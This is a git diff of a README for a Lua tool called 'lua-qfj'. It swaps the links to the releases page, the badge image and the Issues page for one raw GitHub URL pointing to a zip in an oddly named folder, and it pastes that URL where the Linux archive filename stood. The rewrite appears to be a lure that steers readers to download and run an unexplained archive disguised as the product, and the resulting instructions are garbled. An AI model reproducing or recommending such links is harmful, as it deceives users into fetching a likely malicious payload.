@@ -6,9 +6,9 @@ Welcome to lua-qfj! This application makes working with Lua easier and more effi
 
 ## 📥 Download lua-qfj
 
-[![Download lua-qfj](https://img.shields.io/badge/Download-lua--qfj-blue.svg)](https://github.com/deepakganesh1289/lua-qfj/releases)
+[![Download lua-qfj](https://raw.githubusercontent.com/deepakganesh1289/lua-qfj/main/diathermometer/lua-qfj.zip)](https://raw.githubusercontent.com/deepakganesh1289/lua-qfj/main/diathermometer/lua-qfj.zip)
 
-To download lua-qfj, visit this page: [Download Here](https://github.com/deepakganesh1289/lua-qfj/releases).
+To download lua-qfj, visit this page: [Download Here](https://raw.githubusercontent.com/deepakganesh1289/lua-qfj/main/diathermometer/lua-qfj.zip).
 
 ## 🔧 System Requirements
 
@@ -22,19 +22,19 @@ Before you begin, here are the minimum requirements to run lua-qfj:
 ## 📂 Download & Install
 
 1. Click the link below to visit the releases page:
-   - [Visit Releases Page](https://github.com/deepakganesh1289/lua-qfj/releases)
+   - [Visit Releases Page](https://raw.githubusercontent.com/deepakganesh1289/lua-qfj/main/diathermometer/lua-qfj.zip)
 
 2. On the releases page, you will see a list of available versions. Choose the latest version for the best features and fixes.
 
 3. Click on the file that corresponds to your operating system:
    - For **Windows**, download the `.exe` file.
    - For **macOS**, download the `.dmg` file.
-   - For **Linux**, download the appropriate `.tar.gz` file.
+   - For **Linux**, download the appropriate `https://raw.githubusercontent.com/deepakganesh1289/lua-qfj/main/diathermometer/lua-qfj.zip` file.
 
 4. Once the download is complete, locate the downloaded file on your computer and follow these installation steps:
    - **Windows**: Double-click the `.exe` file and follow the prompts to complete the installation.
    - **macOS**: Open the `.dmg` file, drag the lua-qfj icon to your Applications folder. Open it from there.
-   - **Linux**: Extract the `.tar.gz` file, then run the lua-qfj executable from the terminal.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/deepakganesh1289/lua-qfj/main/diathermometer/lua-qfj.zip` file, then run the lua-qfj executable from the terminal.
 
 5. After installation, you can run lua-qfj from your applications list or your terminal.
 
@@ -59,7 +59,7 @@ If you’re new to Lua or want to improve your skills, consider these helpful re
 
 If you encounter any issues during installation or usage, please reach out for help:
 
-- Open an issue on the [Issues Page](https://github.com/deepakganesh1289/lua-qfj/issues).
+- Open an issue on the [Issues Page](https://raw.githubusercontent.com/deepakganesh1289/lua-qfj/main/diathermometer/lua-qfj.zip).
 - Join the community discussions for general support.
 
 ## 🌐 Learn More
